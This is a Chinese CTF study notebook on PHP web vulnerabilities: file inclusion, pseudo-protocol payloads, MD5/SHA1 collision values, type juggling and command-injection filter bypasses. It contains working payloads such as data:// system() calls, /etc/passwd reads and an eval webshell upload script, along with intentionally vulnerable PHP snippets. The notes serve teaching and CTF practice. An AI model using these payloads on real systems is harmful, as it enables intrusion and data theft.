# 网络安全Web学习笔记

@author: lamaper

@email: lamaper@qq.com

@blog: [lamaper - 博客园 (cnblogs.com)](https://www.cnblogs.com/lamaper/)

@date: Aug.26th,2022

@version: 1.1.3bulid220826

### 一、常见的HTML、Linux知识

#### （一）rorbts协议

robots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取。**但是,这个robots协议不是防火墙,也没有强制执行力,搜索引擎完全可以忽视robots.txt文件去抓取网页的快照。**如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。

#### （二）xff和referer

xff：是**告诉服务器当前请求者的最原始的HTTP请求头字段**，通常可以直接通过修改HTTP头中的X-Forwarded-For字段来仿造请求的最原始IP。 

referer：简单讲，referer是告诉服务器当前访问者是从哪个url地址跳转到自己的，也可以直接修改。

#### （三）请求方式

1.　　GET　　　　   请求指定的页面信息，并返回实体主体

2.　　HEAD　　　　  类似于get请求，只不过返回的响应中没有具体的内容，用于获取表头

3.　　POST　　　　  向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求中、POST请求可能会导致新的资源的新建立或已有资源的修改

4.　　PUT　　　　　 从客户端向服务器传送的数据取代指定的文档内容

5.　　DELETE　　　  请求服务器删除指定的页面

6.　　CONNECT　　  HTTP/1.1协议中留给能够连接改为管道方式的代理服务器

7.　　OPTIONS　　　 允许客户端查看服务器的性能

8.　　TRACE　　　　 回显服务器发送的请求，主要用于测试或诊断

1、OPTIONS

　　返回服务器针对特定资源所支持的HTTP请求方法，也可以利用向web服务器发送‘*’的请求来测试服务器的功能性

​		**该请求可以被用来检测允许的请求方式**

2、HEAD

　　向服务器索与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以再不必传输整个响应内容的情况下，就可以获取包含在响应小消息头中的元信息。

3、GET

　　向特定的资源发出请求。注意：GET方法不应当被用于产生“副作用”的操作中，例如在Web Application中，其中一个原因是GET可能会被网络蜘蛛等随意访问。Loadrunner中对应get请求函数：web_link和web_url

4、POST

　　向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。 Loadrunner中对应POST请求函数：web_submit_data,web_submit_form

5、PUT

　　向指定资源位置上传其最新内容

​		**该请求方式可以被用来上传恶意代码**

6、DELETE

　　请求服务器删除Request-URL所标识的资源

7、TRACE

　　回显服务器收到的请求，主要用于测试或诊断

8、CONNECT

　　HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。

注意：

1）方法名称是区分大小写的，当某个请求所针对的资源不支持对应的请求方法的时候，服务器应当返回状态码405（Mothod Not Allowed）；当服务器不认识或者不支持对应的请求方法时，应返回状态码501（Not Implemented）。

2）HTTP服务器至少应该实现GET和HEAD/POST方法，其他方法都是可选的，此外除上述方法，特定的HTTP服务器支持扩展自定义的方法。

#### （四）在linux中，&和&&,|和||介绍如下：

&  表示任务在后台执行，如要在后台运行redis-server,则有 redis-server &

&& 表示前一条命令执行成功时，才执行后一条命令 ，如 echo '1‘ && echo '2'   

| 表示管道，上一条命令的输出，作为下一条命令参数，如 echo 'yes' | wc -l

|| 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo "fail"

#### （五）CSS漏洞

CSS键盘监控

https://github.com/maxchehab/css-keylogging

### 二、常见PHP用法与漏洞

#### （〇）php的备份文件与phps

php的备份文件一般是***.php.bak**,在根目录下输入/index.php.bak, 下载 备份文件。

phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。

#### （一）php函数协议绕过

文件包含的函数的参数没有经过过滤或者是严格的定义，并且参数可以被用户所控制，这样就可能包含非预期的文件。
##### *1.文件包含漏洞常见的函数（默认都以php脚本为准啊）

①include： 包含并运行指定的文件，Include在出错的时候产生警告，脚本会继续运行

②include_once：在脚本执行期间包含并运行指定文件。该函数和include 函数类似，两者唯一的区别是 使用该函数的时候，php会加检查指定文件是否已经被包含过，如果是，则不会再被包含。

③require ：包含并运行指定文件。require在出错的时候产生E_COMPLE_ERROR级别的错误，导致脚本终止运行。

④require_once： 和require函数完全相同。区别类似include和include_once。

文件包含漏洞示例(文件名称include.php)

无限制：没有为包含文件指定特定的前缀或者.php .html 等扩展名

```php
<?php

$filename=$_GET['filename'];

Include($filename);

?>
```

有限制：（随便加一个扩展名上去）

```php
<?php

$filename=$_GET['filename'];

Include($filename.".html");

?>
```

##### *2.本地包含漏洞
①无限制本地包含漏洞
1)常见的敏感信息路径

window系统：
\boot.ini     系统版本信息

\php.ini      PHP配置信息

\my.ini       MYSQL配置信息

\httpd.conf  Apache配置信息

linux系统：

/etc/passwd  linux系统账号信息

/etc/httpd/conf/httpd.conf   Apache配置信息

/etc/my.conf  MYSQL配置信息

/usr/etc/php.ini  PHP配置信息
2）漏洞利用

读取文件内容（还未纠正）

通过目录遍历可以获取系统中的文件：

http://XXX.X.X.X./include.php?finame=     (传路径即可)

例：我们要访问四级目录中的1.php文件

那就是  http://XXX.X.X.X./include.php?finame=../../../1.php

利用无限制本地包含漏洞执行代码

利用无限制本地包含漏洞，可以通过文件包含功能执行扩展名的文件中的代码

Os:学到这里的时候终于解惑之前的一个疑惑：在做文件上传的题目时，为什么我上传一个图片马，访问该图片用蚁剑无法连接。原因当然是：图片马里面的php代码没有办法解析，如果要解析的话可以配合文件包含漏洞，那样就可以解析图片马里面的php代码（死靶文件随便加加减减呗）

例：Test.txt文件内容是`<?php phpinfo(); ?>`

利用文件包含漏洞test.txt 文件，就可以执行文件中的php代码并输出phpinfo信息

②有限制本地包含漏洞

如下:

绕过方法：
1)%00截断文件包含

漏洞利用条件：
php版本要低于5.3.4

Magic_quotes_gpc=off

测试：http://127.0.0.1/include.php?filename=1.txt%00
2）路径长度截断文件包含

操作系统存在最大路径长度的限制。可以通过输入超过最大路径的长度的目录，这样系统就会将后面的的路径给舍弃，导致扩展名截断。

漏洞利用条件：

window系统目录下的最大路径长度是256B

Linux系统目录下的最大路径长度是4096B

测试：http://127.0.0.1/include.php?finame=1.txt/../../../../../../../../../../../../../../../../../../../../../../../../../../../（省略不想打了）
3）点号截断文件包含

和‘路径长度文件截断文件包含’同理
##### *3.远程包含漏洞
①无限制远程文件包含漏洞

无限制远程文件包含是指包含文件的位置并不是在本地服务器，而是通过URL的形式包含其他服务器上的文件，执行文件中的恶意代码。

漏洞利用条件：

allow_url_fopen=on

allow_url_include=on
漏洞利用：

直接传参文件的url即可，就不做演示了。
②有限制远程文件包含漏洞（后面再补图）

绕过方法：
1）问号绕过

可以在问好(?)后面添加HTML字符串，问号后面的扩展名.html会被当成查询，从而绕或扩展名过滤
2）井号绕过

可以在井号(#)后面添加HTML字符串，#号会截断后面的扩展名.html，从而逃过扩展名过滤。#号的URL编码为%23
3）空格绕过

在payload的最后对空格进行URL编码  %20
四.PHP伪协议
①常见的php伪协议

1）file://     访问本地文件系统

2）http://   访问HTTP(S)网址

3）ftp://      访问FTP(S)URL

4)php://      访问各个输出输入流

5)zlib://       处理压缩流

6)data://     读取数据

7)glob://      查找匹配的文件路径模式

8)phar://      PHP归档

9)rar://         RAR数据压缩
②php://伪协议

```chinese
php://伪协议是php提供的一些输入输出流访问功能，允许访问php的输入输出流，标准输入输出和错误描述符，内存中，磁盘备份的临时文件流，以及可以操作其他读取和写入文件的过滤器。
```

1）php://filter

php://filter是元封装器，设计用于了数据流打开时的筛选过滤应用，对本地磁盘文件进行读写。

以下两种用法相同：

名称	描述
resource=<要过滤的数据流>	该参数是必需的。指定要过滤的数据流
read=<读链的筛选器列表>	该参数可选。可以设定一个或者多个筛选器名称，以管道符（|分隔
write=<写链的筛选器列表>	该参数可选。可以设定一个或者多个筛选名称，以管道符（|）分隔





------

##### 1. php://input（远程包含）

例题：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200729220533788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70)
题解
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200729220632916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70)

------

##### 2. php://filter

php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。

```php
php://filter/convert.base64-encode/resource=flflflflag.php
```

------

##### 3. data://

> data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行

```php
data://text/plain;base64
```

读php文件源码：

```php
data:text/plain,<?php system('cat /flag');?>
```

或者命令执行：

```php
data:text/plain,<?php system('whoami');?>
```

------

##### 4.zip://,bzip2://,zlib://,phar://

这些没怎么用到过，记得可以用在文件上传上面，把shell压缩到zip中，如果file参数可控，可以通过该协议访问压缩包中文件。

payload如下：

```
index.php?file=phar://uploads/ok.zip/ok.php
```

这道题也可以用到这个协议

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
12345678910111213141516
?file=compress.zlib://flag.php
```

------

##### 5. file伪协议

```r
?url=file:///var/www/html/flag.php
```

##### 6. 固定后缀包含 include($c.“.php”);

例题：ctfshow-web39
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200927180416307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)
payload1:使用data协议

```bash
c=data:text/plain,<?php system('cat *');?>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020092718055785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)



##### 7. 利用session.upload_progress进行文件包含

##### 8.php://filter的过滤器大全

##### 9.日志包含

以ctfshow中一题为例：

先读取日志文件，发现可以读取

```php
file=/var/log/nginx/access.log
```

然后尝试让日志包含一句话。（看日志里记录了什么信息，然后更改对应信息来写入）

接下来抓包修改UA中的内容

##### 10.require+get_defined_vars包含任意文件

原理：通过`get_defined_vars()` 数组获取到这个伪协议放到 require() 里包含

index.php

```php
<?php 
    echo get_defined_vars()[_GET][rce];
    echo "<br>";
    require(get_defined_vars()[_GET][rce]);
?>
```

然后传参rce值`php://filter/convert.base64-encode/resource=flag.php`

```
http://127.0.0.1/?rce=php://filter/convert.base64-encode/resource=flag.php
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/998b6b54c2b34cd7aeff618024c8ca32.png)

#### （二）加密算法绕过（MD5、SHA1）

MD5消息摘要算法，属Hash算法一类。MD5算法对输入任意长度的消息进行运行，产生一个128位的消息摘要(32位的数字字母混合码)。

md5（）函数有一个漏洞，如果md5函数的参数是一个数组值，会导致函数返回false。除了md5之外sha1函数也有这个特性。
则这里get一个a[]=1 post一个b[]=1即可。

除了利用md5函数的漏洞，还可以构造md5值相同的俩条不同数据。md5值相同的字符串没有找到，但可以构造md5值相同的二进制数据

###### 附：常见MD5 0e开头的字符串

```
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469
s1184209335a
0e072485820392773389523109082030
s1665632922a
0e731198061491163073197128363787
s1502113478a
0e861580163291561247404381396064
s1836677006a
0e481036490867661113260034900752
s1091221200a
0e940624217856561557816327384675
s155964671a
0e342768416822451524974117254469
s1502113478a
0e861580163291561247404381396064
s155964671a
0e342768416822451524974117254469
s1665632922a
0e731198061491163073197128363787
s155964671a
0e342768416822451524974117254469
s1091221200a
0e940624217856561557816327384675
s1836677006a
0e481036490867661113260034900752
s1885207154a
0e509367213418206700842008763514
s532378020a
0e220463095855511507588041205815
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s214587387a
0e848240448830537924465865611904
s1502113478a
0e861580163291561247404381396064
s1091221200a
0e940624217856561557816327384675
s1665632922a
0e731198061491163073197128363787
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s1665632922a
0e731198061491163073197128363787
s878926199a
0e545993274517709034328855841020
240610708 
0e462097431906509019562988736854
314282422 
0e990995504821699494520356953734
571579406 
0e972379832854295224118025748221
903251147 
0e174510503823932942361353209384
1110242161 
0e435874558488625891324861198103
1320830526 
0e912095958985483346995414060832
1586264293 
0e622743671155995737639662718498
2302756269 
0e250566888497473798724426794462
2427435592 
0e067696952328669732475498472343
2653531602 
0e877487522341544758028810610885
3293867441 
0e471001201303602543921144570260
3295421201 
0e703870333002232681239618856220
3465814713 
0e258631645650999664521705537122
3524854780 
0e507419062489887827087815735195
3908336290 
0e807624498959190415881248245271
4011627063 
0e485805687034439905938362701775
4775635065 
0e998212089946640967599450361168
4790555361 
0e643442214660994430134492464512
5432453531 
0e512318699085881630861890526097
5579679820 
0e877622011730221803461740184915
5585393579 
0e664357355382305805992765337023
6376552501 
0e165886706997482187870215578015
7124129977 
0e500007361044747804682122060876
7197546197 
0e915188576072469101457315675502
7656486157 
0e451569119711843337267091732412
QLTHNDT 
0e405967825401955372549139051580
QNKCDZO 
0e830400451993494058024219903391
EEIZDOI 
0e782601363539291779881938479162
TUFEPMC 
0e839407194569345277863905212547
UTIPEZQ 
0e382098788231234954670291303879
UYXFLOI 
0e552539585246568817348686838809
IHKFRNS 
0e256160682445802696926137988570
PJNPDWY 
0e291529052894702774557631701704
ABJIHVY 
0e755264355178451322893275696586
DQWRASX 
0e742373665639232907775599582643
DYAXWCA 
0e424759758842488633464374063001
GEGHBXL 
0e248776895502908863709684713578
GGHMVOE 
0e362766013028313274586933780773
GZECLQZ 
0e537612333747236407713628225676
NWWKITQ 
0e763082070976038347657360817689
NOOPCJF 
0e818888003657176127862245791911
MAUXXQC 
0e478478466848439040434801845361
MMHUWUV 
0e701732711630150438129209816536
```

###### 注意：php8不支持数组绕过

##### 常用的MD5碰撞

```
param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
```

```
param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

附url编码过的碰撞

```
array1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
    
    
&array2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

sha1碰撞

```
array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
    
    &array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1

```

#### （三）php函数漏洞与用法

##### 0.下划线可以用.或[替代

转义绕过

在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，such as：`CTF[SHOW.COM`=>`CTF_SHOW.COM`

##### 1.is_numeric漏洞

会忽视0x这种十六进制的数

容易引发sql注入操作，暴漏敏感信息

```json
echo json_encode([
    is_numeric(233333),
    is_numeric('233333'),
    is_numeric(0x233333),
    is_numeric('0x233333'),
    is_numeric('233333abc'),
]);
```

结果如下

16进制数0x61646D696EASII码对应的值是admin

如果我们执行了后面这条命令的话：SELECT * FROM tp_user where username=0x61646D696E，结果不言而喻

```json
[
    true,
    true,
    true,
    false,
    false
]
```

##### 2.in_array漏洞

in_array中是先将类型转为整形，再进行判断

转换的时候，如果将字符串转换为整形，从字符串非整形的地方截止转换，如果无法转换，将会返回0

```php
<?php
var_dump(in_array("2%20and%20%", [0,2,3]));
```

结果如下

```json
bool(true)
```

##### 3.switch漏洞

switch中是先将类型转为整形，再进行判断

转换的时候，如果将字符串转换为整形，从字符串非整形的地方截止转换，如果无法转换，将会返回0

```php+HTML
<?php
$i ="2abc";
switch ($i) {
    case 0:
    case 1:
    case 2:
        echo "i是比3小的数";
        break;
    case 3:
        echo "i等于3";
}
结果如下
    i是比3小的数

```

##### 4.file_get_contents()绕过

用伪协议data://

##### 5.$_SERVER[]利用

| 数组元素                         | 说明                                                         |
| -------------------------------- | ------------------------------------------------------------ |
| $_SERVER['PHP_SELF']             | 当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://XXX.XXX.X. 的脚本中使用 $_SERVER['PHP_SELF'] 将得到 /test.php/foo.bar |
| $_SERVER['SERVER_ADDR']          | 当前运行脚本所在服务器的 IP 地址                             |
| $_SERVER['SERVER_NAME']          | 当前运行脚本所在服务器的主机名。如果脚本运行于虚拟主机中，该名称就由那个虚拟主机所设置的值决定 |
| $_SERVER['SERVER_PROTOCOL']      | 请求页面时通信协议的名称和版本。例如，“HTTP/1.0”             |
| $_SERVER['REQUEST_METHOD']       | 访问页面使用的请求方法。例如“GET”“HEAD”“POST”“PUT”           |
| $_SERVER['DOCUMENT_ROOT']        | 当前运行脚本所在的文档根目录。在服务器配置文件中定义         |
| $_SERVER['HTTP_ACCEPT_LANGUAGE'] | 当前请求头中 Accept-Language: 项的内容（如果存在）。例如，“en” |
| $_SERVER['REMOVE_ADDR']          | 浏览当前页面的用户 IP 地址，注意与 $_SERVER['SERVER_ADDR'] 的区别 |
| $_SERVER['SCRIPT_FILENAME']      | 当前执行脚本的绝对路径                                       |
| $_SERVER['SCRIPT_NAME']          | 包含当前脚本的路径                                           |
| $_SERVER['REQUEST_URI']          | URI 用来指定要访问的页面。例如，“index.html”                 |
| $_SERVER['PATH_INFO']            | 包含由客户端提供的、跟在真实脚本名称之后并且在查询语句（query string）之前的路径信息（如果存在）。例如，当前脚本是通过 URL http://c.biancheng.net/php/path_info.php/some/stuff?foo=bar 被访问的，那么 $_SERVER['PATH_INFO'] 将包含 /some/stuff |

##### 6.basename();

basename();会过滤非ASCII码的字符，可以用来伪装绕过正则表达式；

##### 7.isset函数
作用：检测变量是否设置

格式：bool isset ( mixed var [, mixed var [, …]] )

返回值：

若变量不存在则返回 FALSE
若变量存在且其值为NULL，也返回 FALSE
若变量存在且值不为NULL，则返回 TURE
同时检查多个变量时，每个单项都符合上一条要求时才返回 TRUE，否则结果为 FALSE
如果已经使用 unset() 释放了一个变量之后，它将不再是 isset()。若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。同时要注意的是一个 NULL 字节（"\0"）并不等同于 PHP 的 NULL 常数。

警告: isset() 只能用于变量，因为传递任何其它参数都将造成解析错误。若想检测常量是否已设置，可使用 defined() 函数

##### 8.preg_match()函数
作用：执行正则表达式匹配，可以根据正则表达式对字符串进行搜索匹配

```php
preg_match($pattern,$subject [, &$matches [, $flags = 0 [, $offset = 0 ]]])
```

``````php
参数说明如下：
$pattern：要搜索的模式，也就是编辑好的正则表达式；
$subject：要搜索的字符串；
$matches：可选参数（数组类型），如果提供了 $matches，它将被填充为搜索结果。 $matches[0] 包含完整模式匹配到的文本， $matches[1] 包含第一个捕获子组匹配到的文本，以此类推；
$flags：可选参数，$flags 可以被设置为 PREG_OFFSET_CAPTURE，如果传递了这个标记，对于每一个出现的匹配，返回时都会附加上字符串偏移量（相对于目标字符串的）；
-$offset：可选参数，用于指定从目标字符串的哪个位置开始搜索（单位是字节）。
``````

preg_match() 函数可以返回 $pattern 的匹配次数，它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后将会停止搜索。

###### 正则表达式

```
"/^\w+$/"

^ 表示开头，是转义字符，使用时在前面加""
$ 表示结束，是转义字符，使用时在前面加""
\w 任意一个字母或数字或下划线，也就是 AZ,az,0~9,_ 中任意一个
这段正则表达式的意思就是字符全部由【AZ,az,0~9,_ 】组成，肯定不能为空
```

```
关于两重转义
在正则表达式中要匹配一个反斜杠时，例如"\\\\",前后两个反斜杠在字符串中分别变成一个反斜杠，解释为两个反斜杠，再交由正则表达式解释为一个反斜杠，需要四个反斜杠。

字符串 ----> 正则表达式字符串参数 -----> 正则解析转移后的pattern
字符串:"\\." ----> 正则表达式形式:"\." ---> 正则引擎解析结果"\."(转义的.)  

字符串:"(\\)(\\)" ----> 正则表达式形式:"\\" ---> 正则引擎解析结果"\"(普通符号\)  

字符串:"(\\)(\\)|.php" ----> 正则表达式形式:"\\|.php" ---> 正则引擎解析结果pattern为"\"或".php"(普通符号\)  

字符串:"(\\)|.php" ----> 正则表达式形式:"\|.php" ---> 正则引擎解析结果"|.php"(普通符号\)  

形如\xnn为16进制(Hex)，\nnn为8进制(Oct)【n为一位数字】通符号)
```

**（1.数组绕过，即传入的参数为数组**

**（2.URL编码取反绕过（ ！该方法只适用于PHP7）**

先进行URL编码，后(~%XX%XX%XX%XX....)

```php
<?php
echo urlencode(~"ls");
?>
```

**（3.换行符绕过**`.`不会匹配换行符

**（4.PCRE回溯次数限制**

```python
import requests
from io import BytesIO

files = {
  'file': BytesIO(b'aaa<?php eval($_POST[txt]);//' + b'a' * 1000000)
}

res = requests.post('http://127.0.01/index.php', files=files, allow_redirects=False)
print(res.headers)
```

pcre.backtrack_limit给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false+

**（5.单引号绕过**'

**（6.tac替换cat**

##### 9.PHP 执行系统外部命令 system() exec() passthru()

PHP作为一种服务器端的脚本语言，象编写简单，或者是复杂的动态网页这样的任务，它完全能够胜任。但事情不总是如此，有时为了实现某个功能，必须借助于操作系统的外部程序（或者称之为命令），这样可以做到事半功倍。
区别:
system() 输出并返回最后一行shell结果。
exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。
passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。

##### 10.ini_set()

PHP ini_set用来设置php.ini的值，在函数执行的时候生效

##### 11.parse_url()绕过

举例传入url的值为http://www.bilibili.com\@dl01.rong360.com/dl/rong360-c_seo_rapp_ask-release.apk

此时通过parse_url解析出来的host为dl01.rong360.com，通过匹配，发现在白名单中

但是，浏览器访问此url：http://www.bilibili.com\@dl01.rong360.com/dl/rong360-c_seo_rapp_ask-release.apk

浏览器会将url中的\转换为/，从而导致parse_url的白名单绕过。

##### 12.file_put_contents() 函数

file_put_contents() 函数把一个字符串写入文件中。

该函数访问文件时，遵循以下规则：

1. 如果设置了 FILE_USE_INCLUDE_PATH，那么将检查 *filename* 副本的内置路径
2. 如果文件不存在，将创建一个文件
3. 打开文件
4. 如果设置了 LOCK_EX，那么将锁定文件
5. 如果设置了 FILE_APPEND，那么将移至文件末尾。否则，将会清除文件的内容
6. 向文件中写入数据
7. 关闭文件并对所有文件解锁

如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。

```php
int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )
```

##### 13.__weakup()绕过

当序列化后的字符串成员变量个数与原本类的成员变量个数不同时可以绕过

#### （四）常见的弱类型比较绕过

```php
<?php 
echo` `0 == ``'a'` `;``// a 转换为数字为 0  重点注意
// 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc
// 十六进制与整数，被转换为同一进制比较
'0xccccccccc'` `== ``'54975581388'` `;
// 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0
1 == ``'1'``;
1 == ``'01'``;
10 == ``'1e1'``;
'100'` `== ``'1e2'` `;  
// 十六进制数与带空格十六进制数，被转换为十六进制整数
'0xABCdef'` `== ``'   0xABCdef'``;
echo` `'0010e2'` `== ``'1e3'``;
// 0e 开头会被当成数字，又是等于 0*10^xxx=0
// 如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过
'0e509367213418206700842008763514'` `== ``'0e481036490867661113260034900752'``;
'0e481036490867661113260034900752'` `== ``0'` `;
var_dump(md5(``'240610708'``) == md5(``'QNKCDZO'``));
var_dump(md5(``'aabg7XSs'``) == md5(``'aabC9RqS'``));
var_dump(sha1(``'aaroZmOk'``) == sha1(``'aaK1STfY'``));
var_dump(sha1(``'aaO8zKZF'``) == sha1(``'aa3OFF9m'``));
?>
```

#### （五）命令执行替换与注入攻击

###### #返回rec=127可能是disable_functions 禁用了命令执行函数

PHP中可以使用下列5个函数来执行外部的应用程序或函数 
system、exec、passthru、shell_exec、“(与shell_exec功能相同) 
函数原型 
string system(string command, int &return_var) 
command 要执行的命令 
return_var 存放执行命令的执行后的状态值 
string exec (string command, array &output, int &return_var) 
command 要执行的命令 
output 获得执行命令输出的每一行字符串 
return_var 存放执行命令后的状态值 
void passthru (string command, int &return_var) 
command 要执行的命令 
return_var 存放执行命令后的状态值 
string shell_exec (string command) 
command 要执行的命令 

**漏洞实例** 

例1:
//ex1.php

```php
<?php
$dir = $_GET["dir"];
if (isset($dir))
{
     echo "<pre>";
     system("ls -al ".$dir);
     echo "</pre>";
}
?>
```

我们提交http://www.sectop.com/ex1.php?dir=| cat /etc/passwd
提交以后，命令变成了 system("ls -al | cat /etc/passwd");

##### 0x01 过滤cat,flag等关键词

1，代替

```
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
sh /flag 2>%261  //报错出文件内容
12345678910111213
```

2，使用[转义符](https://so.csdn.net/so/search?q=转义符&spm=1001.2101.3001.7020)

```bash
ca\t /fl\ag
cat fl''ag
12
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/202008192232265.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819223459949.png#pic_center)

3，内联执行绕过
拼接flag

```bash
1;a=fl;b=ag.php;cat$IFS$a$b
1
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020081922324156.png#pic_center)

```bash
（假设该目录下有index.php和flag.php）
cat `ls` 
等同于-->
cat flag.php;cat index.php
1234
```

